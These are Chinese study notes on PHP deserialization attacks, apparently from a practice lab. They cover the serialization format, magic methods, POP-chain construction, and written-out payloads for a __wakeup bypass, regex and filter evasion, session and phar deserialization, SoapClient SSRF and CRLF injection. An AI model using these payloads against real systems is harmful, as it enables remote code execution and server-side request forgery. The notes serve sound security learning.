# 07 · PHP 反序列化与 POP 链（task7）

> 状态：已掌握（unserialize-lab un1~un9 ）

# 一、序列化 / 反序列化是什么

- **序列化 `serialize()`**：把对象转成字符串（为了存文件/传输）
- **反序列化 `unserialize()`**：把字符串还原成对象

```php
$obj = new User("张三");
$s = serialize($obj);        // 对象 → 字符串
$obj2 = unserialize($s);     // 字符串 → 对象
```

**漏洞点**：**还原时的"类名"和"属性值"都由攻击者控制**，且 PHP 会**自动触发魔术方法**。

# 二、序列化格式（**必背**）

```
O:1:"a":2:{s:6:"object";O:1:"b":1:{...};s:2:"ls";a:1:{i:0;s:6:"system";}}
│ │  │   │  │  │    │              │  │    │
│ │  │   │  │  │    │              │  │    └ 值
│ │  │   │  │  │    │              │  └ 属性名
│ │  │   │  │  │    │              └ 值的类型
│ │  │   │  │  │    └ 属性名长度
│ │  │   │  │  └ 属性个数
│ │  │   │  └ 类名
│ │  │   └ 类名长度
│ │  └ 类型 O=Object
```

## 类型记号

| 记号 | 含义 |
|---|---|
| `O` | 对象 |
| `s` | 字符串 |
| **`S`** | **字符串（可转义）** |
| `i` | 整数 |
| `d` | 浮点数 |
| `b` | 布尔 |
| `N` | null |
| `a` | 数组 |
| **`R`** | **引用（值）** |
| `r` | 引用（对象） |

## 三种可见性的序列化名（**关键**）

| 可见性 | 序列化名 | 例子（长度） |
|---|---|---|
| `public $a` | `a` | `s:1:"a"` |
| `protected $a` | `\0*\0a` | `s:4:"\0*\0a"` |
| `private $a` | `\0类名\0a` | `s:4:"\0A\0a"`（类名 A） |

**长度要算上空字节**：
```
\0 * \0 filename       = 1+1+1+8 = 11
\0 Chest \0 data       = 1+5+1+4 = 11
```

**中文按字节算**：`strlen("张三")` = **6**（UTF-8 一个中文 3 字节）。

## 引用编号规则（`R:n` / `r:n`）

**实测确认**（PHP 5.4 / 8.2 结果一致）：

| 规则 | 说明 |
|---|---|
| **从 1 开始** | 没有 `R:0` |
| **容器自己占 #1** | 最外层对象 / 数组是 #1；`R:1` 指向容器本身（形成递归） |
| **只数「值」** | 属性名、数组键**不占号** |
| **`R:` 自己不吃号** | 写一个 `R:n` 不会让计数器 +1 |
| **只能向前引用** | 引用还没出现的槽位 → **整个 `unserialize()` 失败**（返回 `false`，页面空白） |

**怎么算**：把**容器记作 1**，然后**从前往后数每个属性的值** —— 第 k 个属性的值是第 **k+1** 号。

| 结构 | 谁引用谁 | 写法 |
|---|---|---|
| 2 属性对象 | `p2` ← `p1` | `O:1:"U":2:{s:1:"a";s:1:"X";s:1:"b";R:2;}` |
| **3 属性对象** | **`p3` ← `p2`** | `…s:2:"p3";R:3;}` ← **是 `R:3`，不是 `R:4`** |
| 2 元素数组 | `arr[1]` ← `arr[0]` | `a:2:{i:0;s:1:"x";i:1;R:2;}` |
| 3 元素数组 | `arr[2]` ← `arr[1]` | `a:3:{i:0;s:1:"x";i:1;s:1:"y";i:2;R:3;}` |

**验证方法**（比死记可靠）：让 PHP 自己生成 ——

```php
class T { public $p1; public $p2; public $p3; }
$o = new T();  $o->p1 = "A";  $o->p2 = "B";
$o->p3 = &$o->p2;                  // 让 p3 变成 p2 的引用
echo serialize($o);
// O:1:"T":3:{s:2:"p1";s:1:"A";s:2:"p2";s:1:"B";s:2:"p3";R:3;}
//                                                ↑ 编号自己就出来了
```

>  **写大了不是"引用不上"，是直接失败**：实测 3 属性对象里写 `R:4` / `R:5`，
> `unserialize()` 会返回 `false`，页面**一片空白**。
> 而 `R:2` 不会报错 —— 但它指向的是**别的槽**，复制一份值给你，**改一个另一个不跟着变**。

# 三、反序列化成功的三个条件

| 条件 | 不满足的后果 |
|---|---|
| **① 语法正确** | 返回 `false` |
| **② 类必须已定义** | 得到 `__PHP_Incomplete_Class`（**魔术方法不触发**） |
| **③ 长度/属性名匹配** | 解析中断 |

**`__PHP_Incomplete_Class` 是重要概念** → 这解释了"为什么必须在有类的页面反序列化"。

# 四、魔术方法（**核心**）

| 魔术方法 | 触发时机 |
|---|---|
| `__construct` | `new Class()` |
| **`__destruct`** | **对象销毁（脚本结束）** |
| **`__wakeup`** | **`unserialize()`** |
| `__sleep` | `serialize()` |
| **`__toString`** | **对象被当字符串** |
| **`__call`** | **调不存在/不可访问的方法** |
| **`__get`** | **读不存在/不可访问的属性** |
| `__set` | 写不存在/不可访问的属性 |
| `__isset` | `isset()` 不可访问属性 |
| `__unset` | `unset()` 不可访问属性 |
| `__invoke` | 对象被当函数 `$obj()` |
| `__callStatic` | 静态调不存在的方法 |

## 会触发 `__toString` 的操作

```php
echo $obj;                  //
print $obj;                 //
"abc" . $obj;               // 拼接
"$obj";                     // 双引号插值
strlen($obj);               //
strpos($obj, "x");          //
sprintf("%s", $obj);        //
preg_match("/a/", $obj);    //
```

## 会触发 `__call` 的场景

```php
$obj->不存在的方法();         //
$obj->protected方法();       // （外部调不可访问方法）
```

## 会触发 `__get` 的场景

```php
echo $obj->不存在属性;        //
echo $obj->private属性;      // （属性存在但不可访问）
```

# 五、POP 链（Property-Oriented Programming）

## 5.1 是什么

**用"属性值"串起多个类的魔术方法**，从"自动触发的起点"走到"有危害的终点"。

**为什么叫"属性导向"**：**攻击者唯一能控制的就是"属性里装什么对象"**。

## 5.2 起点与终点

|  | 怎么找 |
|---|---|
| **起点** | 搜 `__destruct` / `__wakeup`（**自动触发**） |
| **终点** | 搜 `echo $flag` / `system` / `eval` / `file_get_contents` / `if(条件)` |

## 5.3 逆推法（**核心方法论**）

```
① 找终点：哪里出 flag / 危险函数？
② 从终点开始，每一步问两个问题：
   · 谁调用了这个方法？      → 搜"方法名("
   · 魔术方法的触发条件是什么？ → 对照触发条件表
③ 一直推到"自动触发的魔术方法"→ 到顶
```

**产出**：一张"要设什么属性"的清单。

## 5.4 构造顺序（**从里往外**）

**规律：被依赖的先写**

```
$a1（终点数据，不依赖任何人）      ← 最先写
 ↓
$c1（依赖 $a1）
 ↓
$a2（依赖 $c1）
 ↓
$b（依赖 $a2）
 ↓
$a3（依赖 $b）                    ← 最后写，并且 serialize 它
```

## 5.5 un8 完整链条（**经典案例**）

```php
class a {
    public $object;
    public function resolve() {                       // 终点
        array_walk($this, function($fn, $prev){
            if ($fn[0] === "system" && $prev === "ls") { echo $flag; }
        });
    }
    public function __destruct() { @$this->object->add(); }        // 起点
    public function __toString() { return $this->object->string; } // 中间
}
class b {
    protected $filename;
    protected function addMe() { return "...".$this->filename; }
    public function __call($func, $args) {                        // 中间
        call_user_func([$this, $func."Me"], $args);
    }
}
class c {
    private $string;
    public function __get($name) {                                // 中间
        $var = $this->$name;
        $var[$name]();
    }
}
```

**链条**：
```
a::__destruct()          起点，自动
  │ @$this->object->add()      (object = b，b 没有 add)
  ↓
b::__call("add")         调不存在的方法
  │ call_user_func([$this,"add"."Me"])  = $this->addMe()
  ↓
b::addMe()               普通方法
  │ "..." . $this->filename    (filename = a2 对象 → 拼接)
  ↓
a2::__toString()         对象当字符串
  │ return $this->object->string   (object = c1，string 是 private)
  ↓
c1::__get("string")      读 private 属性
  │ $var["string"]() = [$a1,"resolve"]()   (数组 callable)
  ↓
a1::resolve()            终点
  │ array_walk($a1) 命中 ls=["system"]
  ↓
echo $flag
```

**payload 构造**：
```php
$a1 = new a();  $a1->ls = ["system"];              // 终点数据
$c1 = new c(["string" => [$a1, "resolve"]]);       // c → a1
$a2 = new a();  $a2->object = $c1;                 // a2 → c1
$b  = new b($a2);                                  // b → a2
$a3 = new a();  $a3->object = $b;                  // a3 → b（起点）
echo urlencode(serialize($a3));                    // serialize 起点
exit(0);                                           // 防止本地触发析构
```

## 5.6 构造链的"填空"三问

**看源码里一行代码，问**：
```
① 这行"操作"了哪个对象？      → 那个属性要指向什么
② 它"读/用了"哪个属性？        → 属性名照写
③ 它"期望"那个属性是什么？      → 字符串/数组/对象？
                              → 决定要触发下一个什么魔术方法
```

# 六、un1~un8 各关考点

| 关 | 考点 | 核心 payload 特征 |
|---|---|---|
| **un1** | 绕过 `__wakeup` | **属性数 1→2**（CVE-2016-7124） |
| **un2** | 触发 `__wakeup` + 正则绕过 | **`O:+5:`**（URL 里 `+` → `%2B`） |
| **un3** | **引用 `R:n`** + 强比较 | **`R:2`**（让两属性共用一份数据） |
| **un4** | **Session 反序列化** | **`\ | ` 开头**（handler 不一致） |
| **un5** | **大写 `S:` 转义** | **`S:8:"\00funny\00a"`**（绕 ASCII 过滤） |
| **un6** | **数组 callable** | **`a:2:{i:0;对象;i:1;"方法";}`** |
| **un7** | **phar 反序列化** | **`phar://路径`**（无需 unserialize） |
| **un8** | **POP 链** | 多类魔术方法接力 |

## 各关要点

**un1 · 绕过 `__wakeup`**
```php
// 正常：O:5:"SoFun":1:{...}  → __wakeup 执行，file 被重置
// 绕过：O:5:"SoFun":2:{...}  → 属性数不匹配 → 跳过 __wakeup
```
PHP ≥ 7.4 已修复。

**un2 · 正则绕过**
```php
if (preg_match('/[oc]:\d+:/i', $a)) die();
// 绕过：O:+5:"funny":0:{}   （冒号后是 +，不是数字）
// URL 里 + 会变成空格 → 必须写 %2B
```

**un3 · 引用 `R:n`**
```php
$this->verify = &$this->password;        // 引用
// 序列化：s:6:"verify";R:2;
// 原理：两属性共用一份内存 → 一个变另一个同步变 → 恒相等
```

**un4 · Session 反序列化**
```
un4.php:  ini_set('session.serialize_handler','php_serialize');  // 存
un42.php: ini_set('session.serialize_handler','php');            // 读
// php 处理器用 | 分隔键和值 → 传 |O:5:"funny":...
// 必须同一 session（同浏览器/cookie）
```

**un5 · 大写 `S:`**
```php
// 小写 s:  s:8:"\0funny\0a"     ← 真的空字节，ord=0 被过滤
// 大写 S:  S:8:"\00funny\00a"   ← 文本全可打印，PHP 解析时还原成空字节
```

**un6 · 数组 callable**
```php
$a = [$funny对象, "pyflag"];
$a();       // → $funny->pyflag()
// 序列化：a:2:{i:0;O:5:"funny":0:{}i:1;s:6:"pyflag";}
```

**un7 · phar 反序列化**
```php
$p = new Phar("u7.phar");
$p->setStub("<?php __HALT_COMPILER(); ?>");    // 必须！否则体积 6000+
$p->setMetadata(new funny());                  // 元数据 = 要反序列化的对象
$p->addFromString("a.txt", "a");               // 至少 1 个文件
// 触发：file_exists("phar://路径") 等**任意文件函数**
// 前提：phar.readonly = 0
```

# 七、PHP 内置类反序列化（没有自定义类时用）

| 内置类 | 魔术方法 | 用途 |
|---|---|---|
| **`SoapClient`** | `__call` | **SSRF（发 HTTP 请求）** |
| `Error` | `__toString` | XSS / 绕哈希比较（PHP 7） |
| `Exception` | `__toString` | 同上（PHP 5/7） |
| `SimpleXMLElement` | `__construct` | XXE |
| `SplFileObject` | `__toString` | 读文件、SSRF |
| `DirectoryIterator` | `__toString` | 列目录（绕 `open_basedir`） |

**SoapClient SSRF payload**：
```
O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/x.php";}
```
**调用任意不存在的方法 → 触发 `__call` → 向 `location` 发请求。**

**CRLF 注入（`uri` 属性）**：
```php
$uri = "aaab\r\nX-Test-Injected: HELLO123";
// → 注入任意 HTTP 头
// 进一步注入 Content-Length + body → 完全控制 POST 请求体
```
**`user_agent` 属性在 PHP 5.5 无效**（网上的写法是 PHP 7 的）。

# 八、踩坑记录

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| **删了 `addMe`** | `Allowed memory size exhausted` | `__call` 拼出的方法名找不到 → 再进 `__call` → 方法名无限增长 | **`__call` 和目标方法必须共存** |
| **`serialize` 错对象** | 链条走不动 | 序列化了"终点数据对象"而非"起点对象" | **serialize 起点** |
| **缺分号** | `Parse error: unexpected token` | 赋值语句末尾没 `;` | 报错行的**上一行**往往是问题 |
| **URL 里 `+`** | base64 损坏 | `+` 在 query 里 = 空格 | 写 `%2B` 或整体 `urlencode()` |
| **phar 不加 setStub** | 体积 6000+ 字节 | PHP 自动填默认 stub | 加 `setStub("<?php __HALT_COMPILER(); ?>")` |

# 九、通用流程（**可复用**）

```
分析期：逆推
① 搜 echo $flag / system / eval      → 终点
② 搜 __destruct / __wakeup            → 起点
③ 从终点倒推，建"要设什么属性"的清单

构造期：正推
④ 拓扑排序：被依赖的先写
⑤ 逐行写：public 直接赋值 / protected·private 用构造函数
⑥ urlencode(serialize(起点对象)) + exit(0)
```

# 十、一句话

> **反序列化 = 类名和属性值都可控 + PHP 自动触发魔术方法**。**POP 链 = 用属性值串起多个类的魔术方法**。**核心方法：从终点逆推（每步问"谁调用了它"），再从里往外正推写代码**。**三种接力：调不存在的方法→`__call`、对象当字符串→`__toString`、读 private 属性→`__get`**。
